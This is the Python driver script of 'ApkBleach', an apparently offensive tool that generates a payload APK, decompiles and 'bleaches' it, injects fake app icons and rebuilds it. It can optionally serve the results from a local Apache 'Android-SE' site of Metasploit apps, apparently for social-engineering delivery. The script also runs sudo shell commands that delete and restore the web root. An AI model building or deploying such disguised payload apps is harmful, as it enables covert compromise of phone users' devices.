#!/usr/bin/python3

'''
Issues to fix:
	spaghetti code like a mother!!!!!
'''

from .bleach import ApkBleach
from colorama import Fore
import os
import os.path
import pkg_resources
from pyfiglet import figlet_format
import subprocess
import sys, itertools
import threading
from time import sleep


def spin(msg, d_msg):
	for cycle in itertools.cycle(['|', '/', '-', '\\']):
		if stop_spin:
			break
		sys.stdout.write(f'\r{Fore.GREEN}{msg}' + f'{Fore.YELLOW}[' + f'{Fore.GREEN}{cycle}' + f'{Fore.YELLOW}]')
		sys.stdout.flush()
		sleep(0.1)
	sys.stdout.write(f'\r{d_msg}')


def main():
	start = ApkBleach()
	payload_path = pkg_resources.resource_filename(__name__, f'res/Cache')

	# Ascii art
	banner = figlet_format('ApkBleach', font='crawford')
	print(Fore.BLUE)
	print('\n'.join(l.center(os.get_terminal_size().columns) for l in banner.splitlines()))
	print(f'\t\t{Fore.YELLOW}Version: {Fore.BLUE}2.0   {Fore.YELLOW}Author: {Fore.BLUE}graylagx2\n'.center(os.get_terminal_size().columns))

	start.check_dependencies()

	global stop_spin
	stop_spin = False
	gen_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Generating payload ", f"{Fore.YELLOW}Payload generated {Fore.GREEN}[*] "))
	gen_loading.start()
	generate = start.generate_payload()
	stop_spin = True
	gen_loading.join()
	print("\n")
	if generate[0] == 'Error':
		for repeat in range(2):
			print("\033[A                                       \033[A")
		os.remove(f"{payload_path}/apkbleach_error.log")
		sys.exit(f"\t{Fore.RED}{generate[1]}{Fore.RESET}\n".center(os.get_terminal_size().columns))

	stop_spin = False
	dec_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Decompiling apk ", f"{Fore.YELLOW}Apk decompiled {Fore.GREEN}[*] "))
	dec_loading.start()
	start.decompile_apk() if os.path.isfile(f'{payload_path}/bleach_me.apk') else sys.exit("Can not find payload Apk")
	stop_spin = True
	dec_loading.join()
	print("\n")

	start.bleach_apk() 
	print(f"{Fore.YELLOW}Apk bleached {Fore.GREEN}[*] \n")

	try:
		if start.icon:
			stop_spin = False
			icon_inject_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Injecting icon ", f"{Fore.YELLOW}Icon injected{Fore.GREEN} [*]  "))
			icon_inject_loading.start()
			start.icon_inject()
			stop_spin = True
			icon_inject_loading.join()
			print("\n")		
	except AttributeError: 
		pass

	if start.deploy_all:
		stop_spin = False
		icon_inject_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Injecting icons ", f"{Fore.YELLOW}Icons injected{Fore.GREEN} [*]  "))
		icon_inject_loading.start()
		start.icon_inject()
		stop_spin = True
		icon_inject_loading.join()
		print("\n")

		perms_needed = subprocess.call(['bash', '-c', f'sudo -n true 2>/dev/null'], stdout=subprocess.PIPE)

		if perms_needed == 1:
			print(f"{Fore.YELLOW}[ Warning ] Deployment server requires permissions\n")
			subprocess.call(['bash', '-c', f'sudo /etc/init.d/apache2 status 1>/dev/null 2>{payload_path}/bleach_server_error.log'], stdout=subprocess.PIPE)
			for repeat in range(3):
				print("\033[A                                                                     \033[A")


		stop_spin = False
		rebuild_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Building server ", f"{Fore.YELLOW}Server Built{Fore.GREEN} [*]      "))
		rebuild_loading.start()
		start.rebuild_apk()
		stop_spin = True
		rebuild_loading.join()
		print("\n")

		if len(os.listdir('/var/www/html/Android-SE/msf_apps')) >= 8:
			
			print(f"{Fore.YELLOW}Bleach server is running on localhost {Fore.GREEN} [*]\n\n")
			print(f"\t\t{Fore.YELLOW}[{Fore.BLUE}Info{Fore.YELLOW}] {Fore.BLUE}Use ctrl+c to shut down the deployment server and restore defaults{Fore.BLACK}".center(os.get_terminal_size().columns))

			while True:
				try:
					input()
					print("\033[A   										\033[A")                                                            
				except KeyboardInterrupt:
					print('\n\n')
					print(f"{Fore.YELLOW}[ Warning ] Deployment server is shutting down".center(os.get_terminal_size().columns))
					if os.path.isdir('/var/www/html_backup'):
						subprocess.call(['bash', '-c', f'sudo rm -r /var/www/html && sudo mv /var/www/html_backup /var/www/html'])
					subprocess.call(['bash', '-c', f'sudo /etc/init.d/apache2 stop &>/dev/null'])
					sleep(.5) 
					print('\n') 
					print(f"\t{Fore.YELLOW}[{Fore.GREEN}Complete{Fore.YELLOW}]\n{Fore.RESET}".center(os.get_terminal_size().columns))
					sys.exit()
		else:
			print(f'\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Something went wrong in building the server files')
			stop_spin = True
			rebuild_loading.join()
			print("\n")
			sys.exit()

	else:
		stop_spin = False
		rebuild_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Rebuilding apk ", f"{Fore.YELLOW}Apk rebuilt{Fore.GREEN} [*]       "))
		rebuild_loading.start()
		start.rebuild_apk()
		stop_spin = True
		rebuild_loading.join()
		print("\n")

	try:
		if not os.access(start.app_path, os.W_OK):
			print(f"{Fore.YELLOW} Your output path is a root path and needs permissions to write to it [*]\n")
			subprocess.call(['bash', '-c', f"sudo -k mv {payload_path}/{start.app_name}.apk {start.output_file} "], stdout=subprocess.PIPE)
					
			for repeat in range(3):
				print("\033[A                                                                               \033[A")
		else:
			subprocess.call(['bash', '-c', f"mv {payload_path}/{start.app_name}.apk {start.output_file} "], stdout=subprocess.PIPE)
			
		if os.path.isfile(start.output_file):
			print(f"{Fore.YELLOW}Rebuilt apk {Fore.GREEN}[*]")
			print(f"\n{Fore.YELLOW}[{Fore.GREEN}Complete{Fore.YELLOW}]{Fore.RESET}")  
			print(f"\t\t\b{Fore.GREEN}\033[4mApk saved as: {start.output_file}{Fore.WHITE}\033[0m".center(os.get_terminal_size().columns))
			print('\n')
			
	except Exception as error: 
		print(error)

if __name__ == "__main__":
	main()

